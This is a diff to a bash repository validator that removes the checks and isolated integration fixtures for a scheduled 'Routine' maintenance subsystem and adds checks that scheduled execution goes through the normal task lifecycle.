@@ -83,7 +83,7 @@ knowledge_source_template="$repo_root/$knowledge_source_template_path"
 knowledge_topic_template="$repo_root/$knowledge_topic_template_path"
 
 # Bootstrap placeholder set: single owner of the "is this tree deployed" predicate.
-# Consumers (run-routine.sh strict gating, the strict check below) query --bootstrap-status
+# Consumers (the strict check below and external adapters) query --bootstrap-status
 # instead of carrying their own copy, so adding a field cannot desynchronize the predicates.
 agent_definition_placeholders='<agent-name>|<agent-role>|<agent-mission>|<agent-vision>|<operator-language>|<project-dir>'
 
@@ -1125,7 +1125,7 @@ finish_run() {
 # --- scoped (--changed) validation ---------------------------------------------
 # The changed set decides the validation scope: normal work on a Project, a Knowledge
 # page, or a Skill validates only those targets plus the Git-boundary epilogue.
-# Any change touching meta canon (tools, evals, routines, area canon files, templates,
+# Any change touching meta canon (tools, evals, area canon files, templates,
 # the registry, or the ignore projection) falls back safely to the full static run.
 
 if [[ "$changed" == true && "$full" != true ]]; then
@@ -1283,8 +1283,6 @@ required_files=(
   'tools/materialize-project-repositories.sh' 'tools/finalize-task.sh' 'tools/run-evals.py'
   'tools/lib/project-registry.sh' 'tools/validator/check-claude-settings.py' '.gitignore'
   'tools/UPSTREAM.md' 'tools/report-upstream-issue.sh' 'tools/REFERENCE.md'
-  'routines/ROUTINES.md' 'routines/maintenance/ROUTINE.md'
-  'tools/run-routine.sh' 'tools/manage-routine-schedule.sh' 'tools/routine-reasoner.py'
   "$knowledge_source_template_path" "$knowledge_topic_template_path"
 )
 for path in "${required_files[@]}"; do require_file "$repo_root/$path"; done
@@ -1308,7 +1306,6 @@ grep -Fqx 'script = "bash tools/setup-local-environment.sh"' "$codex_environment
 for codex_action in \
   'command = "bash tools/validate-agent-directory.sh --changed"' \
   'command = "bash tools/validate-agent-directory.sh --full"' \
-  'command = "bash tools/run-routine.sh maintenance --dry-run"' \
   'command = "bash tools/install-git-hooks.sh --status"' \
   'command = "bash tools/setup-github-auth.sh --check"'; do
   grep -Fqx "$codex_action" "$codex_environment" || \
@@ -1430,10 +1427,6 @@ check_size "$repo_root/tools/UPSTREAM.md" 20480 'tools UPSTREAM.md'
 check_size "$repo_root/tools/REFERENCE.md" 20480 'tools REFERENCE.md'
 check_size "$knowledge_index_file" 8192 'Knowledge index'
 check_size "$knowledge_log_file" 131072 'Knowledge log'
-check_size "$repo_root/routines/ROUTINES.md" 16384 'routines ROUTINES.md'
-while IFS= read -r -d '' routine_contract; do
-  check_size "$routine_contract" 8192 'ROUTINE.md'
-done < <(find "$repo_root/routines" -mindepth 2 -maxdepth 2 -type f -name 'ROUTINE.md' -print0 2>/dev/null)
 check_heading_warning "$repo_root/AGENTS.md" 20
 check_heading_warning "$repo_root/knowledge/KNOWLEDGE.md" 30
 check_heading_warning "$repo_root/skills/SKILLS.md" 30
@@ -1508,6 +1501,20 @@ DEPLOYED_IDENTITY
     fail "router budget fixture: placeholder identity triggered a router warning: $placeholder_budget_probe"
   printf '%s\n' "$deployed_budget_probe" | grep -Fqx 'warnings=0' || \
     fail "router budget fixture: realistic deployed identity triggered a router warning: $deployed_budget_probe"
+
+  # Issue #92 regression: an adopter must have room for a small local contract without
+  # rewriting upstream router text merely to stay below the soft budget.
+  adopter_extension_agents="$router_budget_fixture_dir/adopter-extension-AGENTS.md"
+  cp "$placeholder_agents" "$adopter_extension_agents"
+  printf '\n## 導入先固有契約\n\n- 通常の固有契約を一文追加してもrouter warningを発生させない。\n' >> \
+    "$adopter_extension_agents"
+  adopter_extension_probe="$( (
+    warnings=0
+    check_root_agents_router_size_warning "$adopter_extension_agents" 6144 'root AGENTS.md router'
+    printf 'warnings=%s\n' "$warnings"
+  ) 2>&1 )"
+  printf '%s\n' "$adopter_extension_probe" | grep -Fqx 'warnings=0' || \
+    fail "router budget fixture: an adopter-local contract exhausted upstream headroom: $adopter_extension_probe"
 
   router_overflow_agents="$router_budget_fixture_dir/router-overflow-AGENTS.md"
   cp "$placeholder_agents" "$router_overflow_agents"
@@ -1833,13 +1840,7 @@ required_cases=(
   project-docs-route-required project-docs-design-entry project-architecture-entry
   project-domain-sense-not-spec project-docs-readme-forbidden independent-root-content-boundary
   canonical-area-entry-names
-  routine-trigger-meta-route routine-deterministic-without-model routine-clean-noop
-  routine-stale-cache-regeneration routine-dirty-tree-skipped routine-active-lock-skipped
-  routine-base-sha-abort routine-reasoning-disabled-offline routine-unsupported-provider-rejected
-  routine-model-forbidden-path-blocked routine-model-shell-command-refused
-  routine-model-patch-limit-blocked routine-sandbox-failure-not-applied
-  routine-commit-gated-backup routine-root-independent-boundary
-  routine-scheduler-darwin-launchd routine-scheduler-default-cron routine-schedule-install-explicit
+  scheduled-trigger-normal-task
   control-policy-tamper control-mixed-scope-commit-split control-ordinary-failure-no-penalty
   delegation-default-off delegation-depth-one multi-ai-recommended-profile
   pr-required-remote-completion
@@ -2320,7 +2321,7 @@ grep -Fq 'OPERATING_PROFILE.md' "$repo_root/README.md" || \
   fail 'README.md does not register OPERATING_PROFILE.md'
 for profile_heading in '## 適用と優先順位' '## Capability Role' \
   '## OrchestratorとWorkerの最小契約' '## Repository State' \
-  '## Scheduled WorkflowとRoutineの境界' '## Current Model Recommendations'; do
+  '## Scheduled Execution' '## Current Model Recommendations'; do
   grep -Fqx -- "$profile_heading" "$repo_root/OPERATING_PROFILE.md" || \
     fail "OPERATING_PROFILE.md is missing its responsibility boundary: $profile_heading"
 done
@@ -2331,10 +2332,18 @@ grep -Fq 'Human / Operatorはultimate authority' "$repo_root/OPERATING_PROFILE.m
   fail 'OPERATING_PROFILE.md must preserve Human / Operator authority'
 grep -Fq 'Repositoryのtracked canonical state' "$repo_root/OPERATING_PROFILE.md" || \
   fail 'OPERATING_PROFILE.md must preserve repository canonical state'
+grep -Fq '`Runtime-native scheduler`' "$repo_root/OPERATING_PROFILE.md" || \
+  fail 'OPERATING_PROFILE.md must keep scheduled execution in the Runtime capability boundary'
+grep -Fq '`Route → Target → Work → Verify → Finish`' "$repo_root/OPERATING_PROFILE.md" || \
+  fail 'OPERATING_PROFILE.md must route scheduled triggers through the normal task lifecycle'
+grep -Fq 'Scheduler Engine、daemon、schedule registry' "$repo_root/OPERATING_PROFILE.md" || \
+  fail 'OPERATING_PROFILE.md must refuse an agent-owned scheduler subsystem'
 grep -Fq 'ChatGPT runtime adapterや自動連携を提供しない' "$repo_root/OPERATING_PROFILE.md" || \
   fail 'OPERATING_PROFILE.md must not invent a ChatGPT runtime adapter'
 grep -Fq 'モデル更新時はこの節の推奨値だけを更新' "$repo_root/OPERATING_PROFILE.md" || \
   fail 'OPERATING_PROFILE.md must separate model recommendations from role contracts'
+grep -Fqx '## Scheduled executionケースの最低条件' "$repo_root/evals/EVALS.md" || \
+  fail 'evals/EVALS.md does not own the scheduled execution case minimum conditions'
 # The operator interaction language contract is presence-checked like the other bootloader
 # contracts: deleting the three lines must fail even outside --strict (#28).
 grep -Fq '運用者応対言語' "$repo_root/AGENTS.md" || \
@@ -2537,10 +2546,8 @@ if [[ -f "$repo_root/tools/control-policy.tsv" ]]; then
     'guarded:tools/lib/project-registry.sh' 'guarded:tools/materialize-project-repositories.sh' \
     'guarded:tools/setup-local-environment.sh' 'guarded:tools/setup-github-auth.sh' \
     'guarded:tools/run-evals.py' \
-    'guarded:tools/run-routine.sh' 'guarded:tools/manage-routine-schedule.sh' \
-    'guarded:tools/routine-reasoner.py' 'guarded:evals/EVALS.md' \
-    'guarded:evals/profiles/core.txt' 'guarded:routines/ROUTINES.md' \
-    'guarded:routines/*/ROUTINE.md' 'guarded:projects/AGENTS.md' \
+    'guarded:evals/EVALS.md' 'guarded:evals/profiles/core.txt' \
+    'guarded:projects/AGENTS.md' \
     'guarded:projects/LIFECYCLE.md' 'guarded:projects/REPOSITORIES.md' \
     'contract:projects/*/PROJECT.md'; do
     pinned_tier="${pinned_policy%%:*}"
@@ -2633,178 +2640,6 @@ done <<'SIZE_BUDGET_ROWS'
 | `projects/AGENTS.md` | 2KiB |
 | `projects/<name>/AGENTS.md` | 2KiB |
 SIZE_BUDGET_ROWS
-
-# --- Routine Trigger layer checks (canon: routines/ROUTINES.md)--------------------------------
-
-# A Routine is a Trigger, not a Route. Never add `routine` to the Route table or the Route enum.
-if [[ -f "$repo_root/AGENTS.md" ]]; then
-  if grep -Eq '^\| *`routine` *\|' "$repo_root/AGENTS.md"; then
-    fail 'AGENTS.md defines routine as a Route; a Routine is a trigger, not a Route'
-  fi
-  grep -Fq 'routines/ROUTINES.md' "$repo_root/AGENTS.md" || \
-    fail 'AGENTS.md does not carry the conditional entry to routines/ROUTINES.md'
-fi
-if [[ -f "$repo_root/tools/find-context.sh" ]] && grep -Fq 'routine)' "$repo_root/tools/find-context.sh"; then
-  fail 'tools/find-context.sh must not accept routine as a search route'
-fi
-if [[ -f "$repo_root/routines/ROUTINES.md" ]]; then
-  grep -Fq 'RoutineはRouteではない' "$repo_root/routines/ROUTINES.md" || \
-    fail 'routines/ROUTINES.md must state that a Routine is not a Route'
-  for routine_heading in '## 標準フロー' '## Single Writerと競合防止' '## 予算と上限' \
-    '## 外部Providerへの送信' '## commitとbackup' '## 結果語彙' '## 将来のRoutine追加'; do
-    grep -Fqx -- "$routine_heading" "$repo_root/routines/ROUTINES.md" || \
-      fail "routines/ROUTINES.md is missing the section: $routine_heading"
-  done
-  for routine_token in ROUTINE_NOOP ROUTINE_OK ROUTINE_SKIPPED ROUTINE_BLOCKED ROUTINE_FAILED; do
-    grep -Fq "$routine_token" "$repo_root/routines/ROUTINES.md" || \
-      fail "routines/ROUTINES.md does not document the $routine_token result"
-  done
-fi
-if [[ -f "$repo_root/routines/maintenance/ROUTINE.md" ]]; then
-  for maintenance_heading in '## 日次の決定的Maintenance' '## 広域検証の周期' '## NOOP' \
-    '## optional reasoningと修復境界'; do
-    grep -Fqx -- "$maintenance_heading" "$repo_root/routines/maintenance/ROUTINE.md" || \
-      fail "routines/maintenance/ROUTINE.md is missing the section: $maintenance_heading"
-  done
-fi
-
-# The initial version ships Maintenance only. Do not pre-create Research files or empty templates.
-for premature_routine_path in routines/research routines/_template routines/AGENTS.md routines/CLAUDE.md; do
-  [[ ! -e "$repo_root/$premature_routine_path" ]] || \
-    fail "$premature_routine_path must not exist; only the Maintenance Routine ships in v1"
-done
-if [[ -d "$repo_root/routines" ]]; then
-  while IFS= read -r -d '' routine_root_entry; do
-    routine_entry_name="${routine_root_entry##*/}"
-    if [[ -f "$routine_root_entry" ]]; then
-      [[ "$routine_entry_name" == 'ROUTINES.md' ]] || \
-        fail "routines/ must contain only ROUTINES.md and routine directories: $(relative_path "$routine_root_entry")"
-    else
-      require_file "$routine_root_entry/ROUTINE.md"
-      if [[ -f "$repo_root/tools/run-routine.sh" ]] && \
-        ! grep -Eq "^  $routine_entry_name\) ;;\$" "$repo_root/tools/run-routine.sh"; then
-        fail "tools/run-routine.sh does not register the routine id: $routine_entry_name"
-      fi
-    fi
-  done < <(find "$repo_root/routines" -mindepth 1 -maxdepth 1 \( -type f -o -type d \) \
-    ! -name '.gitkeep' ! -name '.DS_Store' -print0 2>/dev/null)
-fi
-
-# Routine Tool executable bits, syntax, and safety boundaries.
-for routine_tool in tools/run-routine.sh tools/manage-routine-schedule.sh; do
-  routine_tool_file="$repo_root/$routine_tool"
-  [[ ! -f "$routine_tool_file" ]] && continue
-  [[ -x "$routine_tool_file" ]] || fail "$routine_tool is not executable"
-  "$syntax_bash" -n "$routine_tool_file" 2>/dev/null || fail "$routine_tool fails bash -n"
-done
-if [[ -f "$repo_root/tools/run-routine.sh" ]]; then
-  grep -Fq 'unknown-routine' "$repo_root/tools/run-routine.sh" || \
-    fail 'tools/run-routine.sh does not reject unknown routine ids'
-  # The deployment predicate has exactly one owner (--bootstrap-status). A second placeholder
-  # copy in run-routine.sh is how #29 happened: one list updated, the other left behind.
-  grep -Fq -- '--bootstrap-status' "$repo_root/tools/run-routine.sh" || \
-    fail 'tools/run-routine.sh must query the validator --bootstrap-status instead of testing placeholders itself'
-  if grep -Fq '<agent-name>' "$repo_root/tools/run-routine.sh"; then
-    fail 'tools/run-routine.sh must not carry its own copy of the agent definition placeholder set'
-  fi
-  for forbidden_routine_git in reset clean stash pull merge rebase push; do
-    if grep -Eq "git[^#]*[[:space:]]$forbidden_routine_git([[:space:]]|\$)" "$repo_root/tools/run-routine.sh"; then
-      fail "tools/run-routine.sh must not run git $forbidden_routine_git"
-    fi
-  done
-fi
-if [[ -f "$repo_root/tools/manage-routine-schedule.sh" ]]; then
-  grep -Fq 'LaunchAgents' "$repo_root/tools/manage-routine-schedule.sh" || \
-    fail 'tools/manage-routine-schedule.sh must manage user LaunchAgents'
-  if grep -Fq 'LaunchDaemons' "$repo_root/tools/manage-routine-schedule.sh"; then
-    fail 'tools/manage-routine-schedule.sh must not touch LaunchDaemons'
-  fi
-  if grep -Fq 'backup-to-github' "$repo_root/tools/manage-routine-schedule.sh"; then
-    fail 'tools/manage-routine-schedule.sh must not schedule backups; schedule arrival is not a backup trigger'
-  fi
-fi
-if [[ -f "$repo_root/tools/routine-reasoner.py" ]]; then
-  grep -Fq 'SUPPORTED_PROVIDERS = ("deepseek", "openai", "anthropic")' "$repo_root/tools/routine-reasoner.py" || \
-    fail 'tools/routine-reasoner.py provider enum must be exactly deepseek | openai | anthropic'
-  if command -v python3 >/dev/null 2>&1; then
-    python3 -c "import ast; ast.parse(open('$repo_root/tools/routine-reasoner.py').read())" 2>/dev/null || \
-      fail 'tools/routine-reasoner.py fails Python syntax parsing'
-    if python3 -c "
-import ast, sys
-tree = ast.parse(open('$repo_root/tools/routine-reasoner.py').read())
-allowed = {'json', 'os', 'socket', 'sys', 'urllib.error', 'urllib.request'}
-for node in ast.walk(tree):
-    names = []
-    if isinstance(node, ast.Import):
-        names = [alias.name for alias in node.names]
-    elif isinstance(node, ast.ImportFrom):
-        names = [node.module or '']
-    for name in names:
-        if name not in allowed:
-            sys.exit(1)
-" 2>/dev/null; then :; else
-      fail 'tools/routine-reasoner.py imports outside the standard-library allowlist'
-    fi
-  fi
-fi
-
-# .env.example carries placeholders only; no real values and no real model IDs.
-if [[ -f "$repo_root/.env.example" ]]; then
-  grep -Fq 'deepseek | openai | anthropic' "$repo_root/.env.example" || \
-    fail '.env.example does not document the provider enum deepseek | openai | anthropic'
-  for empty_env_key in AGENT_ROUTINE_REASONING_PROVIDER AGENT_ROUTINE_REASONING_MODEL \
-    DEEPSEEK_API_KEY OPENAI_API_KEY ANTHROPIC_API_KEY \
-    DEEPSEEK_BASE_URL OPENAI_BASE_URL ANTHROPIC_BASE_URL; do
-    grep -Eq "^$empty_env_key=$" "$repo_root/.env.example" || \
-      fail ".env.example must declare $empty_env_key with an empty placeholder value"
-    if grep -Eq "^$empty_env_key=..*" "$repo_root/.env.example"; then
-      fail ".env.example must not carry a real value for $empty_env_key"
-    fi
-  done
-  grep -Eq '^AGENT_ROUTINE_REASONING_ENABLED=false$' "$repo_root/.env.example" || \
-    fail '.env.example must default AGENT_ROUTINE_REASONING_ENABLED to false'
-fi
-
-# The Routine canon enters the meta catalog as a conditional candidate; runtime derivatives are never Git-tracked.
-if [[ -f "$repo_root/tools/build-context-cache.sh" ]]; then
-  grep -Fq "'routines/ROUTINES.md|" "$repo_root/tools/build-context-cache.sh" || \
-    fail 'tools/build-context-cache.sh does not register routines/ROUTINES.md as meta canon'
-fi
-if [[ -n "$tracked_files_snapshot" ]]; then
-  while IFS= read -r tracked_routine_file; do
-    [[ -n "$tracked_routine_file" ]] || continue
-    case "$tracked_routine_file" in
-      routines/*.md) ;;
-      routines/*)
-        fail "routines/ may track Markdown canon only: $tracked_routine_file"
-        ;;
-    esac
-    case "$tracked_routine_file" in
-      *routines/logs/*|*routines/locks/*|*routines/state/*)
-        fail "routine runtime state must not be tracked: $tracked_routine_file"
-        ;;
-    esac
-  done < <(printf '%s\n' "$tracked_files_snapshot" | grep -E '^routines/' || true)
-fi
-
-grep -Fq 'run-routine.sh' "$repo_root/tools/TOOLS.md" || \
-  fail 'tools/TOOLS.md does not register run-routine.sh'
-grep -Fq 'manage-routine-schedule.sh' "$repo_root/tools/TOOLS.md" || \
-  fail 'tools/TOOLS.md does not register manage-routine-schedule.sh'
-grep -Fq 'routine-reasoner.py' "$repo_root/tools/TOOLS.md" || \
-  fail 'tools/TOOLS.md does not register routine-reasoner.py'
-grep -Fq 'routines/ROUTINES.md' "$repo_root/README.md" || \
-  fail 'README.md does not register routines/ROUTINES.md'
-grep -Fq 'run-routine.sh' "$repo_root/README.md" || \
-  fail 'README.md does not register run-routine.sh'
-grep -Fq 'manage-routine-schedule.sh' "$repo_root/README.md" || \
-  fail 'README.md does not register manage-routine-schedule.sh'
-grep -Fq 'schedule到達' "$repo_root/tools/BACKUP.md" || \
-  fail 'tools/BACKUP.md does not scope scheduled maintenance against the backup trigger'
-grep -Fq 'backup-only Routine' "$repo_root/tools/BACKUP.md" || \
-  fail 'tools/BACKUP.md does not forbid backup-only routines'
-grep -Fqx '## Routineケースの最低条件' "$repo_root/evals/EVALS.md" || \
-  fail 'evals/EVALS.md does not own the Routine case minimum conditions'
 
 # Integration fixtures for real Git, cache, backup, and the materializer run only under --full.
 # The default run is limited to static structural checks; Tool changes require --full (owned by tools/TOOLS.md).
@@ -4351,736 +4186,6 @@ fi
   fi
 
   validator_metric_checkpoint 'full-core'
-  # --- Routine integration fixture (canon: routines/ROUTINES.md)-----------------------------------
-  # Never touch the real crontab, real LaunchAgents, or real Provider APIs; verify only with an isolated copy, mocks, and a temporary HOME.
-  routine_fixture_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-routine.XXXXXX")"
-  cleanup_paths+=("$routine_fixture_dir")
-  routine_work="$routine_fixture_dir/work"
-  mkdir -p "$routine_work"
-  real_head_before_routine_fixture=''
-  if git -C "$repo_root" rev-parse HEAD >/dev/null 2>&1; then
-    real_head_before_routine_fixture="$(git -C "$repo_root" rev-parse HEAD)"
-  fi
-  # Faithfully copy the real repo's tracked plus non-ignored working tree. Independent clones and .agent-cache are excluded by ignore rules.
-  routine_copy_list="$routine_fixture_dir/copied.paths"
-  : > "$routine_copy_list"
-  while IFS= read -r routine_copy_path; do
-    [[ -n "$routine_copy_path" && -f "$repo_root/$routine_copy_path" ]] || continue
-    routine_copy_parent="$routine_work/${routine_copy_path%/*}"
-    [[ "$routine_copy_path" == */* ]] || routine_copy_parent="$routine_work"
-    mkdir -p "$routine_copy_parent"
-    cp -p "$repo_root/$routine_copy_path" "$routine_work/$routine_copy_path"
-    printf '%s\n' "$routine_copy_path" >> "$routine_copy_list"
-  done < <(git -C "$repo_root" ls-files -co --exclude-standard 2>/dev/null | LC_ALL=C sort -u)
-
-  # Registered Independent repositories are deliberately excluded from this isolated
-  # Routine fixture: attachment integrity was already checked against the real clones
-  # above, and copying Project bodies here would cross the root ownership boundary.
-  # Keep the fixture internally consistent by projecting the same empty attachment set
-  # into both its canonical registry and derived ignore block.
-  routine_registry="$routine_work/projects/REPOSITORIES.md"
-  if [[ -f "$routine_registry" ]]; then
-    routine_registry_pending="$routine_fixture_dir/REPOSITORIES.pending"
-    awk '
-      { print }
-      $0 == "### 登録" { exit }
-    ' "$routine_registry" > "$routine_registry_pending"
-    printf '\n現在、Independent Projectは登録されていない。\n' >> "$routine_registry_pending"
-    mv "$routine_registry_pending" "$routine_registry"
-  fi
-  routine_ignore="$routine_work/projects/.gitignore"
-  if [[ -f "$routine_ignore" ]]; then
-    routine_ignore_pending="$routine_fixture_dir/projects.gitignore.pending"
-    awk '
-      $0 == "# BEGIN INDEPENDENT PROJECTS" { print; in_managed = 1; next }
-      $0 == "# END INDEPENDENT PROJECTS" { in_managed = 0; print; next }
-      !in_managed { print }
-    ' "$routine_ignore" > "$routine_ignore_pending"
-    mv "$routine_ignore_pending" "$routine_ignore"
-  fi
-
-  mkdir -p "$routine_fixture_dir/tmp"
-  routine_env=(HOME="$routine_fixture_dir" GIT_CONFIG_NOSYSTEM=1
-    GIT_AUTHOR_NAME=fixture GIT_AUTHOR_EMAIL=fixture@example.invalid
-    GIT_COMMITTER_NAME=fixture GIT_COMMITTER_EMAIL=fixture@example.invalid
-    AGENT_VALIDATOR_NESTED_FIXTURE=1
-    TMPDIR="$routine_fixture_dir/tmp")
-  routine_git() { env "${routine_env[@]}" git -C "$routine_work" "$@"; }
-  routine_git init -q
-  routine_git symbolic-ref HEAD refs/heads/main
-  routine_concurrent_path='routine-concurrent-writer.txt'
-  printf 'fixture baseline\n' > "$routine_work/$routine_concurrent_path"
-  # Paths hidden by the fixture's ignore projection (e.g. under evals/fixtures) are tracked explicitly, as in the real repo.
-  tr '\n' '\0' < "$routine_copy_list" | \
-    env "${routine_env[@]}" xargs -0 git -C "$routine_work" add -f --
-  routine_git add -f -- "$routine_concurrent_path"
-  routine_git commit -q -m 'fixture: routine workspace'
-  routine_base_sha="$(routine_git rev-parse HEAD)"
-
-  routine_state_dir="$routine_work/.agent-cache/routines/state"
-  seed_routine_last_full() {
-    mkdir -p "$routine_state_dir"
-    date +%s > "$routine_state_dir/maintenance-last-full"
-  }
-  routine_extra_env=()
-  routine_output=''
-  routine_status=0
-  routine_run() {
-    set +e
-    routine_output="$(env "${routine_env[@]}" ${routine_extra_env[@]+"${routine_extra_env[@]}"} \
-      AGENT_DIRECTORY_ROOT="$routine_work" bash "$routine_work/tools/run-routine.sh" "$@" 2>/dev/null)"
-    routine_status=$?
-    set -e
-  }
-  routine_expect() {
-    printf '%s\n' "$routine_output" | grep -Fq -- "$1" || \
-      fail "routine fixture: $2 did not report: $1 (got: $(printf '%s' "$routine_output" | tail -n 1))"
-  }
-  routine_expect_clean() {
-    [[ -z "$(routine_git status --porcelain)" ]] || \
-      fail "routine fixture: $1 left the working tree modified"
-  }
-
-  # Nested real-validator runs dominate --full wall time (~3s × 17 invocations on near-identical
-  # content). Keep the real validator only for representative runs (the PASS path on the clean
-  # tree and the first FAIL path on the broken probe); every other run uses a stand-in that
-  # checks exactly the property the probe exercises (the Wiki topic status vocabulary) with the
-  # real validator's FAIL wording, so every expectation below still sees real findings.
-  # Each swap is committed because run-routine.sh refuses a dirty tree, and routine_base_sha is
-  # re-read because later cases compare HEAD against it.
-  routine_real_validator_copy="$routine_fixture_dir/real-validator.sh"
-  cp "$routine_work/tools/validate-agent-directory.sh" "$routine_real_validator_copy"
-  routine_commit_validator_swap() {
-    routine_git add -- tools/validate-agent-directory.sh
-    routine_git commit -q -m "fixture: $1"
-    routine_base_sha="$(routine_git rev-parse HEAD)"
-  }
-  routine_use_standin_validator() {
-    cat > "$routine_work/tools/validate-agent-directory.sh" <<'ROUTINE_STANDIN'
-#!/usr/bin/env bash
-# Routine-fixture stand-in: reproduces only the probe check (Wiki topic status vocabulary)
-# with the real validator's exact FAIL wording, at a fraction of the cost. Arguments are
-# accepted and ignored so --strict/--full call sites keep working.
-set -euo pipefail
-root="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
-status_ok=true
-for page in "$root"/knowledge/wiki/topics/*.md; do
-  [[ -f "$page" ]] || continue
-  page_status="$(awk '
-    NR == 1 && $0 != "---" { exit }
-    NR > 1 && $0 == "---" { exit }
-    index($0, "status:") == 1 { sub(/^[^:]+:[[:space:]]*/, ""); print; exit }
-  ' "$page")"
-  case "$page_status" in
-    active|superseded|archived|retired) ;;
-    *)
-      printf 'FAIL: %s has an invalid status\n' "${page#"$root"/}"
-      status_ok=false
-      ;;
-  esac
-done
-[[ "$status_ok" == true ]] || exit 1
-printf 'PASS: agent-directory structure is valid\n'
-ROUTINE_STANDIN
-    routine_commit_validator_swap 'stand-in validator'
-  }
-  routine_use_real_validator() {
-    cp "$routine_real_validator_copy" "$routine_work/tools/validate-agent-directory.sh"
-    routine_commit_validator_swap 'real validator restored'
-  }
-
-  # Clean dry run: generate nothing and NOOP. The cache is only reported stale, not regenerated.
-  seed_routine_last_full
-  routine_run maintenance --dry-run
-  (( routine_status == 0 )) || fail 'routine fixture: the clean dry run exited non-zero'
-  routine_expect 'ROUTINE_NOOP id=maintenance' 'the clean dry run'
-  routine_expect 'dry_run=true' 'the clean dry run'
-  routine_expect 'cache=stale' 'the clean dry run'
-  [[ ! -f "$routine_work/.agent-cache/catalog.tsv" ]] || \
-    fail 'routine fixture: the dry run regenerated the context cache'
-
-  # Normal run: regenerate the stale cache once with the existing Tool, then NOOP. No commit and no backup.
-  routine_run maintenance
-  (( routine_status == 0 )) || fail 'routine fixture: the clean run exited non-zero'
-  routine_expect 'ROUTINE_NOOP id=maintenance' 'the clean run'
-  routine_expect 'reasoning=disabled' 'the clean run'
-  routine_expect 'cache=rebuilt' 'the clean run'
-  [[ -f "$routine_work/.agent-cache/catalog.tsv" ]] || \
-    fail 'routine fixture: the clean run did not regenerate the stale cache'
-  [[ "$(routine_git rev-parse HEAD)" == "$routine_base_sha" ]] || \
-    fail 'routine fixture: a NOOP run created a commit'
-  routine_expect_clean 'the clean run'
-  # The real validator has proven the PASS path through run-routine; later runs only need
-  # probe-sensitive semantics, so switch to the cheap stand-in from here.
-  routine_use_standin_validator
-  routine_run maintenance
-  routine_expect 'cache=current' 'the warm second run'
-
-  # The daily run owns routing freshness only; the workspace inventory (manifest) is
-  # checked and rebuilt once by the full cycle, and a dry run only reports it stale.
-  rm -f "$routine_work/.agent-cache/manifest.tsv"
-  routine_run maintenance
-  routine_expect 'ROUTINE_NOOP id=maintenance' 'the daily run with a missing manifest'
-  routine_expect 'cache=current' 'the daily run with a missing manifest'
-  [[ ! -f "$routine_work/.agent-cache/manifest.tsv" ]] || \
-    fail 'routine fixture: the daily run regenerated the workspace inventory (manifest)'
-  routine_run maintenance --full --dry-run
-  routine_expect 'cache=manifest-stale' 'the full dry run with a missing manifest'
-  [[ ! -f "$routine_work/.agent-cache/manifest.tsv" ]] || \
-    fail 'routine fixture: the full dry run regenerated the manifest'
-  routine_run maintenance --full
-  routine_expect 'ROUTINE_NOOP id=maintenance' 'the full run with a missing manifest'
-  routine_expect 'cache=rebuilt' 'the full run with a missing manifest'
-  [[ -f "$routine_work/.agent-cache/manifest.tsv" ]] || \
-    fail 'routine fixture: the full run did not regenerate the manifest'
-
-  # An unknown Routine ID is rejected without changing anything.
-  routine_run bogus-routine
-  (( routine_status != 0 )) || fail 'routine fixture: an unknown routine id was accepted'
-  routine_expect 'ROUTINE_FAILED id=bogus-routine phase=resolve reason=unknown-routine' 'the unknown id run'
-
-  # On a dirty working tree, report SKIPPED without changing anything.
-  printf 'dirty\n' >> "$routine_work/AGENTS.md"
-  routine_run maintenance
-  routine_expect 'ROUTINE_SKIPPED id=maintenance reason=dirty-working-tree' 'the dirty tree run'
-  grep -Fq 'dirty' "$routine_work/AGENTS.md" || \
-    fail 'routine fixture: the dirty tree run modified the unowned change'
-  routine_git checkout -q -- AGENTS.md
-
-  # With a valid lock (a live PID), never run concurrently and never steal the lock.
-  routine_lock_dir="$routine_work/.agent-cache/routines/locks/workspace.lock"
-  mkdir -p "$routine_lock_dir"
-  {
-    printf 'routine=maintenance\npid=%s\n' "$$"
-    printf 'hostname=%s\n' "$(hostname 2>/dev/null || printf 'unknown-host')"
-  } > "$routine_lock_dir/info"
-  routine_run maintenance
-  routine_expect 'ROUTINE_SKIPPED id=maintenance reason=active-writer' 'the active lock run'
-  [[ -d "$routine_lock_dir" ]] || fail 'routine fixture: an active lock was removed'
-
-  # A lock whose owner cannot be determined (missing info: a writer mid-acquisition) is active, not stale.
-  rm -f "$routine_lock_dir/info"
-  routine_run maintenance
-  routine_expect 'ROUTINE_SKIPPED id=maintenance reason=active-writer' 'the ownerless lock run'
-  [[ -d "$routine_lock_dir" ]] || fail 'routine fixture: a lock without an info file was stolen'
-
-  # Same for an info file with an unparsable PID: never treat it as provably stale.
-  {
-    printf 'routine=maintenance\npid=%s\n' 'not-a-pid'
-    printf 'hostname=%s\n' "$(hostname 2>/dev/null || printf 'unknown-host')"
-  } > "$routine_lock_dir/info"
-  routine_run maintenance
-  routine_expect 'ROUTINE_SKIPPED id=maintenance reason=active-writer' 'the corrupt lock run'
-  [[ -d "$routine_lock_dir" ]] || fail 'routine fixture: a lock with a corrupt info file was stolen'
-
-  # Only a stale lock whose PID is provably dead on the same host is removed before continuing.
-  sh -c ':' &
-  routine_stale_pid=$!
-  wait "$routine_stale_pid" 2>/dev/null || true
-  {
-    printf 'routine=maintenance\npid=%s\n' "$routine_stale_pid"
-    printf 'hostname=%s\n' "$(hostname 2>/dev/null || printf 'unknown-host')"
-  } > "$routine_lock_dir/info"
-  routine_run maintenance
-  routine_expect 'ROUTINE_NOOP id=maintenance' 'the stale lock run'
-
-  # Restore the real validator for the first broken-probe run, so the FAIL path (probe
-  # detection and findings parsing) is proven end-to-end against the real implementation once.
-  routine_use_real_validator
-
-  # Create a finding for the deterministic checks: a Wiki topic with an invalid status (a low-risk repair target).
-  routine_probe='knowledge/wiki/topics/routine-probe.md'
-  {
-    printf '%s\n' '---' 'summary: routine fixture probe' 'status: activ' 'aliases: [routine-probe]' '---'
-    printf '%s\n' '' '# routine probe'
-  } > "$routine_work/$routine_probe"
-  routine_git add -- "$routine_probe"
-  routine_git commit -q -m 'fixture: broken probe'
-  routine_base_sha="$(routine_git rev-parse HEAD)"
-
-  # Reasoning disabled: even with findings, send nothing externally and report only deterministic results.
-  routine_run maintenance
-  (( routine_status != 0 )) || fail 'routine fixture: validator findings did not fail the routine'
-  routine_expect 'ROUTINE_FAILED id=maintenance phase=validation reason=validator-failures' 'the disabled reasoning run'
-  routine_expect 'reasoning=disabled' 'the disabled reasoning run'
-
-  # Both real-validator paths are now covered; the remaining cases (provider gating, patch
-  # safety, sandbox verification, commit scoping) only need probe-sensitive PASS/FAIL results.
